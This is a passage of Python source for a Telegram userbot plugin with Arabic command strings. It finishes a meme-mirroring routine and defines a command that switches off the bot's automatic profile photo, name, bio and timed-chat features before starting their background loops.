    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@essa.on(admin_cmd(pattern="ايقاف ([\s\S]*)"))
async def _(event):  # sourcery no-metrics
    input_str = event.pattern_match.group(1)
    if input_str == f"{OR_FOTOAUTO}":
        if gvarstatus(f"{OR_FOTOAUTO}") is not None and gvarstatus(f"{OR_FOTOAUTO}") == "true":
            delgvar(f"{OR_FOTOAUTO}")
            await event.client(
                functions.photos.DeletePhotosRequest(                    await event.client.get_profile_photos("me", limit=1)                )            )
            return await edit_delete(event, "**⁂ ⦙  تم إيقـاف  صوره وقتية الآن ✓**")
        return await edit_delete(event, "**⁂ ⦙  لم يتـم تفعيـل صوره وقتية ✕**")
    if input_str == f"{OR_NAMEAUTO}":
        if gvarstatus(f"{OR_NAMEAUTO}") is not None and gvarstatus(f"{OR_NAMEAUTO}") == "true":
            delgvar(f"{OR_NAMEAUTO}")
            await event.client(                functions.account.UpdateProfileRequest(first_name=DEFAULTUSER)            )
            return await edit_delete(event, "**⁂ ⦙  تم إيقـاف الإسـم الوقتـي الآن ✓**")
        return await edit_delete(event, "**⁂ ⦙  لم يتـم تفعيـل الإسـم الوقتـي ✕**")
    if input_str == f"{OR_AUTOBIO}":
        if gvarstatus(f"{OR_AUTOBIO}") is not None and gvarstatus(f"{OR_AUTOBIO}") == "true":
            delgvar(f"{OR_AUTOBIO}")
            await event.client(                functions.account.UpdateProfileRequest(about=DEFAULTUSERBIO)            )
            return await edit_delete(event, "**⁂ ⦙  تم إيقـاف البايـو التلقائـي الآن ✓**")
        return await edit_delete(event, "**⁂ ⦙  لم يتـم تفعيـل البايـو التلقائـي ✕**")
    if input_str == "محادثة وقتية":
        if getGrChAuto() is not None:
            deletAutoChGR()
            return await edit_delete(event, "** تـم ايقاف المحادثة الوقتية **")
        return await edit_delete(event, "** لم يتم تفعيل المحادثة الوقتية بالأصل **")
    END_CMDS = [f"{OR_FOTOAUTO}", f"{OR_NAMEAUTO}", f"{OR_AUTOBIO}", "محادثة وقتية"]
    if input_str not in END_CMDS:
        await edit_delete(            event,            f"⁂ ⦙   {input_str} أمـر الإنهـاء غيـر صالـح، اذڪـر بوضـوح ما يجـب أن أنهـي !",            parse_mode=_format.parse_pre        )
essa.loop.create_task(digitalpicloop())
essa.loop.create_task(autoname_loop())
essa.loop.create_task(autobio_loop())
essa.loop.create_task(GrChiq_loop())        
